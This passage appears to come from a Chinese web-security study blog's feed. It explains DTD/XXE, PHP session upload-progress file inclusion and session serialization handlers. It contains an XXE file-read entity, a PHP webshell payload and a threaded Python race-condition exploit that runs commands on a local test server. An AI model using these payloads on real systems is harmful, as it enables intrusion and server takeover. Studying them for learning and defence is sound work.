class=\"name\">from</span>&gt;</span>Jani<span class=\"tag\">&lt;/<span class=\"name\">from</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">heading</span>&gt;</span>Reminder<span class=\"tag\">&lt;/<span class=\"name\">heading</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">note</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"dtd学习\"><a class=\"markdownIt-Anchor\" href=\"#dtd学习\">#</a> DTD 学习</h3>\n<p>DTD (文档类型定义) 可以定义合法的 XML 文档构建模块，它使用一系列合法的元素来定义文档的结构</p>\n<ul>\n<li>DTD 可以被成行地声明于 XML 文档中，也可以作一个外部引用</li>\n</ul>\n<h4 id=\"1内部doctype声明\"><a class=\"markdownIt-Anchor\" href=\"#1内部doctype声明\">#</a> 1. 内部 DOCTYPE 声明</h4>\n<p>格式:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE root-element [element-declarations]&gt;</span><br></pre></td></tr></table></figure>\n<p>例如上面的外部引用可以改成到一个 xml 源文件里:</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span>?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">note</span> [</span></span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ELEMENT <span class=\"keyword\">note</span> (<span class=\"keyword\">to</span>,<span class=\"keyword\">from</span>,<span class=\"keyword\">heading</span>,<span class=\"keyword\">body</span>)&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ELEMENT <span class=\"keyword\">to</span> (<span class=\"keyword\">#PCDATA</span>)&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ELEMENT <span class=\"keyword\">from</span> (<span class=\"keyword\">#PCDATA</span>)&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ELEMENT <span class=\"keyword\">heading</span> (<span class=\"keyword\">#PCDATA</span>)&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ELEMENT <span class=\"keyword\">body</span> (<span class=\"keyword\">#PCDATA</span>)&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">note</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">to</span>&gt;</span>Tove<span class=\"tag\">&lt;/<span class=\"name\">to</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">from</span>&gt;</span>Jani<span class=\"tag\">&lt;/<span class=\"name\">from</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">heading</span>&gt;</span>Reminder<span class=\"tag\">&lt;/<span class=\"name\">heading</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span>Don&#x27;t forget me this weekend<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">note</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"2外部文档声明\"><a class=\"markdownIt-Anchor\" href=\"#2外部文档声明\">#</a> 2. 外部文档声明</h4>\n<p>上面有例子，就是把 DTD 声明单独放在一个文件，再在 xml 文件引入</p>\n<h4 id=\"dtd元素声明\"><a class=\"markdownIt-Anchor\" href=\"#dtd元素声明\">#</a> DTD 元素声明</h4>\n<ul>\n<li>声明一个元素: <code>&lt;!ELEMENT element-name category&gt;</code> , 或者 <code>&lt;!ELEMENT element-name (element-content)&gt;</code> ,<br>\n 这个 category 或者 content 可以是:</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(#PCDATA)</span><br><span class=\"line\">ANY</span><br><span class=\"line\">(child1,chile2....)</span><br></pre></td></tr></table></figure>\n<p>还有很多，不一一列举了</p>\n<h4 id=\"属性声明\"><a class=\"markdownIt-Anchor\" href=\"#属性声明\">#</a> 属性声明</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ATTLIST element-name attribute-name attribute-type attribute-value&gt;  </span><br><span class=\"line\">  </span><br><span class=\"line\">DTD 实例:  </span><br><span class=\"line\">  </span><br><span class=\"line\">&lt;!ATTLIST payment type CDATA &quot;check&quot;&gt;  </span><br><span class=\"line\">  </span><br><span class=\"line\">XML 实例:  </span><br><span class=\"line\">  </span><br><span class=\"line\">&lt;payment type=&quot;check&quot; /&gt;</span><br></pre></td></tr></table></figure>\n<h4 id=\"实体\"><a class=\"markdownIt-Anchor\" href=\"#实体\">#</a> 实体</h4>\n<p>实体的属性是 ENTITY<br>\n 实体是定义引用普通文本或特殊字符的快捷方式的变量<br>\n语法:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY entity-name &quot;entity-value&quot;&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DTD 实例:  </span><br><span class=\"line\">  </span><br><span class=\"line\">&lt;!ENTITY writer &quot;Donald Duck.&quot;&gt;  </span><br><span class=\"line\">&lt;!ENTITY copyright &quot;Copyright runoob.com&quot;&gt;  </span><br><span class=\"line\">  </span><br><span class=\"line\">XML 实例：  </span><br><span class=\"line\">  </span><br><span class=\"line\">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure>\n<p>实体分类：</p>\n<ol>\n<li>内部实体与外部实体：就是上面举过例子的外部引入和内部声明</li>\n<li>通用实体和参数实体：<br>\n(1) 通用实体用 <code>&amp;实体名;</code>  的实体，在 DTD 中被定义，xml 文档被使用</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE foo [</span><br><span class=\"line\">    &lt;!ELEMENT creds ANY &gt;</span><br><span class=\"line\">    &lt;!ENTITY xxe SYSTEM &quot;file:///c:/1.txt&quot; &gt;</span><br><span class=\"line\">]&gt;</span><br><span class=\"line\">&lt;creds&gt;&amp;xxe;</span><br><span class=\"line\">&lt;/creds&gt;</span><br></pre></td></tr></table></figure>\n<p>(2) 参数实体</p>\n<ul>\n<li>使用 <code>% 实体名</code>  (<mark>这里空格不能少</mark>), 在 DTD 中定义，并且只能在 DTD 中使用 <code>%实体名;</code>  引用</li>\n</ul>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/07/01/session%E5%AE%89%E5%85%A8/",
            "url": "https://hq185187.github.io/2023/07/01/session%E5%AE%89%E5%85%A8/",
            "title": "session安全",
            "date_published": "2023-07-01T06:51:21.100Z",
            "content_html": "<h2 id=\"一session文件包含\"><a class=\"markdownIt-Anchor\" href=\"#一session文件包含\">#</a> 一.session 文件包含</h2>\n<h3 id=\"前置知识\"><a class=\"markdownIt-Anchor\" href=\"#前置知识\">#</a> 前置知识</h3>\n<ol>\n<li>session.upload_progress 是 PHP5.4 添加的，所以 PHP 版本要 &gt; 5.4</li>\n<li>什么是 session.upload_progress? 可以理解为文件上传进度，就是当一个文件上传时，如果我们同时 POST 一个与 session.upload_progress.name 同名的变量，上传进度可以在 <code>$_session</code>  里获得 (也就是那个 session 文件里),PHP 会在 <code>$_session</code>  里创建一个索引是 session.upload_progress.prefix 和 session.upload_progress.name 连接一起的值<br>\n<mark>重点</mark>:<br>\n 假设我设置:</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;&#125;, </span><br></pre></td></tr></table></figure>\n<p>此时在 sess_TGAO 里的文件内容就有 <code>upload_progress_&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;</code> , 此时就可以配合文件包含漏洞来 rce 了</p>\n<ol start=\"3\">\n<li>几个默认参数</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.session.upload_progress.enabled=on</span><br><span class=\"line\">2. session.upload_progress.cleanup = on  </span><br><span class=\"line\">3. session.upload_progress.prefix = &quot;upload_progress_&quot;  </span><br><span class=\"line\">4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;  </span><br><span class=\"line\">5. session.upload_progress.freq = &quot;1%&quot;  </span><br><span class=\"line\">6. session.upload_progress.min_freq = &quot;1&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">`enabled=on`表示`upload_progress`功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</span><br><span class=\"line\"></span><br><span class=\"line\">`cleanup=on`表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；</span><br><span class=\"line\"></span><br><span class=\"line\">`name`当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</span><br><span class=\"line\"></span><br><span class=\"line\">`prefix+name`将表示为session中的键名</span><br></pre></td></tr></table></figure>\n<h3 id=\"文件包含利用\"><a class=\"markdownIt-Anchor\" href=\"#文件包含利用\">#</a> 文件包含利用</h3>\n<p>示例代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$b</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"variable\">$b</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>我们没有可以包含的恶意文件，可以利用 session.upload_progress 将恶意语句写入 session, 再包含 session 文件，但是不知道 session 文件的存放位置</p>\n<p>分析:<br>\n1. 怎么开启 session_start ()?</p>\n<ul>\n<li>如果 session.auto_start=On, 则 PHP 在接收请求时会自动初始化 session, 不需要再执行 session_start (), 但默认情况下，这个选项是关闭的</li>\n<li>session.use_strict_mode 默认是 0, 此时用户可以自定义 Seesion ID 的。比如我们在 Cookie 里设置 PHPSESSID=TT,PHP 将会在服务器上创建一个文件:/tmp/sess_TT 即使此时用户没有初始化 Session，PHP 也会自动初始化 Session。 并产生一个键值，这个键值有 ini.get (“session.upload_progress.prefix”)+ 由我们构造的 session.upload_progress.name 值组成，最后被写入 sess_文件里。<br>\n2. 默认配置 session.upload_progress.cleanup=On 导致文件上传后，session 文件内容立即清空，怎么进行 rce?–条件竞争</li>\n</ul>\n<p>脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> io  </span><br><span class=\"line\"><span class=\"keyword\">import</span> requests  </span><br><span class=\"line\"><span class=\"keyword\">import</span> threading  </span><br><span class=\"line\">  </span><br><span class=\"line\">sessid = <span class=\"string\">&#x27;TGAO&#x27;</span>  </span><br><span class=\"line\">data = &#123;<span class=\"string\">&quot;cmd&quot;</span>: <span class=\"string\">&quot;system(&#x27;whoami&#x27;);&quot;</span>&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">write</span>(<span class=\"params\">session</span>):  </span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:  </span><br><span class=\"line\">        f = io.BytesIO(<span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">1024</span> * <span class=\"number\">50</span>)  </span><br><span class=\"line\">        resp = session.post(<span class=\"string\">&#x27;http://127.0.0.1:5555/test56.php&#x27;</span>,  </span><br><span class=\"line\">                            data=&#123;<span class=\"string\">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class=\"string\">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,  </span><br><span class=\"line\">                            files=&#123;<span class=\"string\">&#x27;file&#x27;</span>: (<span class=\"string\">&#x27;tgao.txt&#x27;</span>, f)&#125;, cookies=&#123;<span class=\"string\">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">read</span>(<span class=\"params\">session</span>):  </span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:  </span><br><span class=\"line\">        resp = session.post(<span class=\"string\">&#x27;http://127.0.0.1:5555/test56.php?file=session/sess_&#x27;</span> + sessid, data=data)  </span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&#x27;tgao.txt&#x27;</span> <span class=\"keyword\">in</span> resp.text:  </span><br><span class=\"line\">            <span class=\"built_in\">print</span>(resp.text)  </span><br><span class=\"line\">            event.clear()  </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:  </span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[+++++++++++++]retry&quot;</span>)  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:  </span><br><span class=\"line\">    event = threading.Event()  </span><br><span class=\"line\">    <span class=\"keyword\">with</span> requests.session() <span class=\"keyword\">as</span> session:  </span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> xrange(<span class=\"number\">1</span>, <span class=\"number\">30</span>):  </span><br><span class=\"line\">            threading.Thread(target=write, args=(session,)).start()  </span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> xrange(<span class=\"number\">1</span>, <span class=\"number\">30</span>):  </span><br><span class=\"line\">            threading.Thread(target=read, args=(session,)).start()  </span><br><span class=\"line\">    event.<span class=\"built_in\">set</span>()</span><br></pre></td></tr></table></figure>\n<p>过程:<br>\n 此脚本的意思是先利用 write 函数，上传一个文件 tgao.txt, 发送 post 请求写 shell 到 session 文件里 ( <code>upload_progress_&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;</code> ), 然后在进行读取 session 里的执行恶意命令的结果 (whoami), 此时会先判断它的上传过程信息文件里是否有 tgao.txt, 来确定是否 write 函数成功写 shell, 或者还没被删除，如果有 tgao.txt 再 print 出执行恶意命令的结果</p>\n<p><mark>注意:</mark><br>\n 这个 session 文件的格式大概是这样的:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">upload_progress_&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;|a:5:&#123;s:10:&quot;start_time&quot;;i:1688050992;s:14:&quot;content_length&quot;;i:51480;s:15:&quot;bytes_processed&quot;;i:5254;s:4:&quot;done&quot;;b:0;s:5:&quot;files&quot;;a:1:&#123;i:0;a:7:&#123;s:10:&quot;field_name&quot;;s:4:&quot;file&quot;;s:4:&quot;name&quot;;s:8:&quot;tgao.txt&quot;;s:8:&quot;tmp_name&quot;;N;s:5:&quot;error&quot;;i:0;s:4:&quot;done&quot;;b:0;s:10:&quot;start_time&quot;;i:1688050992;s:15:&quot;bytes_processed&quot;;i:0;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p>可以发现注入点还可以在文件名 filename 处 (此处可以构造 session 反序列化漏洞)</p>\n<h2 id=\"二session反序列化\"><a class=\"markdownIt-Anchor\" href=\"#二session反序列化\">#</a> 二.session 反序列化</h2>\n<p>session 原理流程：<br>\n<img data-src=\"https://image.3001.net/images/20220311/1646988659_622b0d7380818dab56a63.png\" alt=\"\"></p>\n<h3 id=\"php-session序列化机制\"><a class=\"markdownIt-Anchor\" href=\"#php-session序列化机制\">#</a> PHP session 序列化机制:</h3>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">处理器</th>\n<th style=\"text-align:center\">对应的存储格式</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">php</td>\n<td style=\"text-align:center\">键名 + 竖线 + 经过 serialize（） 函数反序列处理的值</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">php_binary</td>\n<td style=\"text-align:center\">键名的长度对应的 ASCII 字符 + 键名 + 经过 serialize（） 函数反序列处理的值</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">php_serialize(php&gt;=5.54)</td>\n<td style=\"text-align:center\">经过 serialize（） 函数反序列处理的数组</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"php处理器\"><a class=\"markdownIt-Anchor\" href=\"#php处理器\">#</a> php 处理器</h4>\n<p>接下来举个例子，我们分析它的过程，：<br>\n代码是：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">ini_set</span>(<span class=\"string\">&#x27;session.serialize_handler&#x27;</span>,<span class=\"string\">&#x27;php&#x27;</span>);</span><br><span class=\"line\"><span class=\"comment\">//这里以php处理器为例</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">session_start</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;name&#x27;</span>] = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;name&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;name&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>此时我们 url 为？name=hhaa<br>\n 过程：</p>\n<ol>\n<li>产生新的 PHPSESSID（8pj72deu5v3c6d8i7t7qlpnqd5），初始化 <code>$_SESSION</code> , 使用 <code>$_SESSION</code>  存储数据</li>\n<li>将 <code>$_SESSION</code>  存储的数据序列化存储为 PHPSESSID 文件（也就是 sess_PHPESEEID 文件）</li>\n<li>将包含 PHPSESSID 值的 cookie 通过响应头返回浏览器<br>\n此时的文件名为 <code>sess_8pj72deu5v3c6d8i7t7qlpnqd5</code> , 文件内容是:</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">name|s:4:&quot;hhaa&quot;;</span><br></pre></td></tr></table></figure>\n<p>格式是键名 ( <code>$_SESSION['name']</code>  的键名 name)+ 竖线 (|)+ 经过 serialize () 函数反序列化处理的值 (s:4:“hhaa”😉</p>\n<p>具体图片:<br>\n<img data-src=\"https://s2.loli.net/2023/06/30/6kxeBtsO8KIAPFV.png\" alt=\"屏幕截图 2023-06-30 233321.png\"></p>\n<h4 id=\"php_binary处理器\"><a class=\"markdownIt-Anchor\" href=\"#php_binary处理器\">#</a> php_binary 处理器</h4>\n<p>代码:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">ini_set</span>(<span class=\"string\">&#x27;session.serialize_handler&#x27;</span>,<span class=\"string\">&#x27;php_binary&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">session_start</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 为了方便ACSII显示，将键名设置为36个字符长度</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;namenamenamenamenamenamenamenamename&#x27;</span>] = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;name&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;namenamenamenamenamenamenamenamename&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>三种方式的文件命名方式一样的，此时的文件内容:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$namenamenamenamenamenamenamenamenames:4:&quot;hhaa&quot;;</span><br></pre></td></tr></table></figure>\n<p>存储格式为：键名的长度对应的 ASCII 字符 ( <code>$</code> )+ 键名 (namenamenamenamenamenamenamenamename)+ 经过 serialize () 函数反序列化后的值 (s:4:“hhaa”😉</p>\n<p>图片:<br>\n<img data-src=\"https://s2.loli.net/2023/07/01/kQg2rj7W5UBJMbS.png\" alt=\"屏幕截图 2023-06-30 235836.png\"></p>\n<h4 id=\"php_serialize处理器\"><a class=\"markdownIt-Anchor\" href=\"#php_serialize处理器\">#</a> php_serialize 处理器</h4>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">ini_set</span>(<span class=\"string\">&#x27;session.serialize_handler&#x27;</span>,<span class=\"string\">&#x27;php_serialize&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">session_start</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;name&#x27;</span>] = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;name&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;name&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>此时的文件内容是:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a:1:&#123;s:4:&quot;name&quot;;s:4:&quot;hhaa&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"反序列化漏洞利用\"><a class=\"markdownIt-Anchor\" href=\"#反序列化漏洞利用\">#</a> 反序列化漏洞利用</h3>\n<p>session 的反序列化漏洞，就是利用 <code>php</code>  处理器和 <code>php_serialize</code>  处理器的存储格式差异而产生</p>\n<p>test.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">session_start();</span><br><span class=\"line\"></span><br><span class=\"line\">class f4ke&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    public $name;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __wakeup()&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">      echo &quot;Who are you?&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __destruct()&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">      